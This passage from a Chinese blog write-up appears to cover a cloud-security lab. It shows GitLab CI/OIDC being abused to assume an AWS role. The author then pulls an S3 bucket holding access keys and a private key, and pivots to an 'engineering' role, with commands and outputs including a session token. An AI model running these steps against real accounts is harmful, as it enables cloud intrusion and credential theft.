class="string">&quot;project_path:huge-logistics/*&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>该 IAM 角色 <code>gitlab_terraform_deploy</code> 专门为 GitLab CI&#x2F;CD 配置，允许 GitLab 项目通过 OIDC 身份验证临时扮演该角色执行操作。角色信任策略限制了访问主体为 GitLab 的 OIDC 提供者，并仅允许 <code>huge-logistics</code> 下的项目使用，同时要求 token 的 audience 为 <code>https://gitlab.com</code>。角色最大会话时长为 1 小时，用于控制临时凭证的有效期，从而保证安全性和最小权限原则。</p>
<blockquote>
<p>在 AWS 中，OIDC提供商允许外部身份验证用户代入 IAM 角色，从而实现身份联合。</p>
<blockquote>
<p><strong>什么是 OpenID Connect (OIDC)？</strong></p>
<p>这是一个基于 OAuth 2.0 构建的身份验证协议，允许应用程序根据身份提供商 (IdP) 执行的身份验证来验证用户身份。在 AWS 中，OIDC 通常用于集成第三方身份提供商（例如 Google、Okta、GitLab 或 GitHub）以承担 AWS IAM 角色并访问 AWS 资源。</p>
</blockquote>
</blockquote>
<h3 id="利用-GitLab-CI-CD-获取临时凭证"><a href="#利用-GitLab-CI-CD-获取临时凭证" class="headerlink" title="利用 GitLab CI&#x2F;CD 获取临时凭证"></a>利用 GitLab CI&#x2F;CD 获取临时凭证</h3><p>同时题中还提供了一个gitlab账户</p>
<p>该账户中有一个代码仓库是属于<code>huge-logistics</code>组的</p>
<p>我们可以进入到这个仓库<code>settings -&gt; CI/CD -&gt; Variables</code></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221939076.png" alt="image-20250922193915966"></p>
<p>然后加上三个变量</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221940998.png" alt="image-20250922194013918"></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221940389.png" alt="image-20250922194021331"></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221940309.png" alt="image-20250922194032249"></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221940459.png" alt="image-20250922194050390"></p>
<p>然后在代码仓库中选择WEBIDE对仓库中的<code>.gitlab-ci.yml</code>内容进行修改</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221941716.png" alt="image-20250922194141648"></p>
<p>将<code>.gitlab-ci.yml</code>内容修改成</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="attr">AWS_DEFAULT_REGION:</span> <span class="string">us-east-1</span></span><br><span class="line">  <span class="attr">AWS_PROFILE:</span> <span class="string">&quot;oidc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">oidc:</span></span><br><span class="line">  <span class="attr">image:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">amazon/aws-cli:latest</span></span><br><span class="line">    <span class="attr">entrypoint:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">id_tokens:</span></span><br><span class="line">    <span class="attr">GITLAB_OIDC_TOKEN:</span></span><br><span class="line">      <span class="attr">aud:</span> <span class="string">https://gitlab.com</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">aws</span> <span class="string">sts</span> <span class="string">get-caller-identity</span></span><br></pre></td></tr></table></figure>

<p>之后将它推送到main分支</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221944337.png" alt="image-20250922194424245"></p>
<blockquote>
<p><code>.gitlab-ci.yml</code> 是 <strong>GitLab CI&#x2F;CD</strong> 的核心配置文件，用于定义项目的 <strong>自动化流程</strong>（Pipeline）。它通常放在项目根目录下。该文件的作用有 定义 Pipeline、 自动化构建&#x2F;测试&#x2F;部署、 统一管理 DevOps 流程。</p>
</blockquote>
<p>然后导航到<code>build -&gt; Jobs</code>中就可以看到运行日志了</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221946902.png" alt="image-20250922194620807"></p>
<p>我们已经成功的承担了gitlab_terraform_deploy 角色</p>
<p>再将<code>.gitlab-ci.yml</code>文件的内容改成</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="attr">AWS_DEFAULT_REGION:</span> <span class="string">us-east-1</span></span><br><span class="line">  <span class="attr">AWS_PROFILE:</span> <span class="string">&quot;oidc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">oidc:</span></span><br><span class="line">  <span class="attr">image:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">amazon/aws-cli:latest</span></span><br><span class="line">    <span class="attr">entrypoint:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">id_tokens:</span></span><br><span class="line">    <span class="attr">GITLAB_OIDC_TOKEN:</span></span><br><span class="line">      <span class="attr">aud:</span> <span class="string">https://gitlab.com</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">aws</span> <span class="string">s3</span> <span class="string">ls</span></span><br></pre></td></tr></table></figure>

<p>推送到main之后在看日志的话是可以看到有一个<code>huge-logistics-engineering-db3ba0baab43</code>存储桶的</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221947707.png" alt="image-20250922194754626"></p>
<p>然后修改<code>.gitlab-ci.yml</code>文件的<code>script</code>部分。 改成<code>aws s3 ls s3://huge-logistics-engineering-db3ba0baab43</code>来查看桶中内容</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221949182.png" alt="image-20250922194951103"></p>
<p>修改<code>.gitlab-ci.yml</code>文件</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="attr">AWS_DEFAULT_REGION:</span> <span class="string">us-east-1</span></span><br><span class="line">  <span class="attr">AWS_PROFILE:</span> <span class="string">&quot;oidc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">oidc:</span></span><br><span class="line">  <span class="attr">image:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">amazon/aws-cli:latest</span></span><br><span class="line">    <span class="attr">entrypoint:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">id_tokens:</span></span><br><span class="line">    <span class="attr">GITLAB_OIDC_TOKEN:</span></span><br><span class="line">      <span class="attr">aud:</span> <span class="string">https://gitlab.com</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">aws</span> <span class="string">s3</span> <span class="string">sync</span> <span class="string">s3://huge-logistics-engineering-db3ba0baab43/</span> <span class="string">.</span></span><br><span class="line">  <span class="attr">artifacts:</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">backup.txt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ec2.pem</span></span><br></pre></td></tr></table></figure>

<p>在构建完成后 可以在日志页面下载桶中内容</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221952418.png" alt="image-20250922195235300"></p>
<p>在<code>backup.txt</code>中有着<code>louise</code>用户的AKsK</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221959155.png" alt="image-20250922195958084"></p>
<p>地区信息可以curl访问刚才的存储桶获得</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509222000706.png" alt="image-20250922200042638"></p>
<h3 id="横向移动：从-louise-到-engineering-角色"><a href="#横向移动：从-louise-到-engineering-角色" class="headerlink" title="横向移动：从 louise 到 engineering 角色"></a>横向移动：从 louise 到 engineering 角色</h3><p>配置好AKSK之后执行<code>aws sts get-caller-identity</code>我们现在已经获取到了louise的权限</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">573909305106</span>$ aws sts get-caller-identity --profile louise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AIDA3G7WQODFNVB5QKQ7M&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;770926735562&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::770926735562:user/louise&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>查看一下权限策略</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">573909305106</span>$ aws iam list-attached-user-policies --user-name louise</span><br><span class="line">--profile louise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AttachedPolicies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;PolicyName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ViewIamPermissions&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PolicyArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::770926735562:policy/ViewIamPermissions&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">573909305106</span>$ aws iam list-user-policies --user-name louise --profile</span><br><span class="line"> louise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;PolicyNames&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>前面提到 <code>bob</code> 和 <code>louise</code> 可以扮演 <code>engineering</code> 这个角色</p>
<p>承担engineering这个角色<code> aws sts assume-role --role-arn arn:aws:iam::770926735562:role/engineering --role-session-name newlouise --profile louise</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>/mnt/c/Users/legion/Downloads/artifacts (<span class="number">2</span>)$ aws sts assume-role --role-arn arn<span class="punctuation">:</span>aws<span class="punctuation">:</span>iam<span class="punctuation">:</span><span class="punctuation">:</span><span class="number">770926735562</span><span class="punctuation">:</span>role/engineering --role-session-name newlouise --profile louise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Credentials&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AccessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AS****111FI7PKFWHY&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SecretAccessKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ERalyD25XvVxxkhWqHGRW8oHH&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SessionToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;IQoJb3JpZ2luX2VjEKb//////////wEaCXVzLXdlc3QtMiJHMEUCIC7JKdJKJxJF5FcuqE2TnJcKLcx7IojyCuct68zIyW+QAiEAw2IIWhXl7OgfSJC6ofGEkgqcxm+uYePzMZEpHKn1jfcqlgIILhAAGgw3NzA5MjY3MzU1NjIiDHdnUEHHG+bBGDfTWyrzAWYQGMHFHDmfzT0fjCzOEISFHQXdu6Yv5CRMz4JEyd6gfM1xdCGDmByZXM0O3edIVo07RG7ZNeHTEm//O9rYbw6EbY65Sn5ezJ5q/n16+eJosn101K13wyLj1cJO66rffX4gfa/h45mceDD4q2xZ3zVfTJU1qPENpn2tU28p8W24yyiqmNxmZxYcPdYeB+vVCpdJSkvy1iABSqsmpcMOgzzQl+t4Ys1mpNPE8xAZST+uaYeJI9gQhLtFmu40NYCzJ2BpK+vXZoIwZlv3BqOLBP43IWueEM1UyN3UX2yM4ZZ40mH4hL99NKORGxNMT6BmHe2xdTD0mcXGBjqdAbuhCFDPUYTn7G05nm2Lg2WKDUC1JjT7lxZtwmx4cpm9o0d5Unc2MeDmvmnaqAp3Xp62QZfnqT99GNzTIdTqOa9ElV1oMTxgzruSGBEminfLNzvJWktx/uc+j/dg1y4xkhTV/esHghOtpdggLQZ5pbGQIkpi5jSaw9m0nCSsV20qTbaTPxLNqomydTRgEcCT1UXB9vV76zBLM4nYAWc=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Expiration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T14:19:48+00:00&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AssumedRoleUser&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AssumedRoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA3G7WQODFI66VGN24Q:newlouise&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::770926735562:assumed-role/engineering/newlouise&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>配置好AKSK之后 ,确实我们已经成功承担了该角色</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>/mnt/c/Users/legion/Downloads/artifacts (<span class="number">2</span>)$ aws sts get-caller-identity --profile newlouise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA3G7WQODFI66VGN24Q:newlouise&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;770926735562&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::770926735562:assumed-role/engineering/newlouise&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="进一步渗透：获取-bob-的凭证"><a href="#进一步渗透：获取-bob-的凭证" class="headerlink" title="进一步渗透：获取 bob 的凭证"></a>进一步渗透：获取 bob 的凭证</h3><p>然后使用aws-enumerator枚举一下权限</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509222146938.png" alt="image-20250922214614807"></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509222147391.png" alt="image-20250922214741320"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/go/bin$ aws ec2 describe-instances --region us-west<span class="number">-2</span> --profile newlouise</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Reservations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;ReservationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;r-0392ffd1379b98a0a&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OwnerId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;770926735562&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Groups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Instances&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Architecture&quot;</span><span class="punctuation">:</span> <span class="string">&quot;x86_64&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;BlockDeviceMappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;DeviceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/dev/sda1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;Ebs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;AttachTime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T12:50:00+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;DeleteOnTermination&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;attached&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;VolumeId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vol-078c7ed406d82ff80&quot;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ClientToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;terraform-20250922124958944100000006&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;EbsOptimized&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;EnaSupport&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Hypervisor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xen&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;NetworkInterfaces&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;Attachment&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;AttachTime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T12:49:59+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;AttachmentId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eni-attach-051bc8df53a9682e4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;DeleteOnTermination&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;DeviceIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;attached&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;NetworkCardIndex&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">                            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;Groups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;GroupId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sg-02bfdf237bd43e0a7&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;GroupName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Child Two Internal SG&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;Ipv6Addresses&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;MacAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;06:82:e0:17:b3:61&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;NetworkInterfaceId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eni-0ba9c90918846a458&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;OwnerId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;770926735562&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;PrivateDnsName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ip-10-1-20-57.us-west-2.compute.internal&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;PrivateIpAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.1.20.57&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;PrivateIpAddresses&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;Primary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;PrivateDnsName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ip-10-1-20-57.us-west-2.compute.internal&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;PrivateIpAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.1.20.57&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;SourceDestCheck&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;in-use&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;SubnetId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;subnet-06a9cf60bde2ecd54&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;VpcId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vpc-0453fadd63f4de860&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;InterfaceType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;interface&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;Operator&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;Managed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                    <span 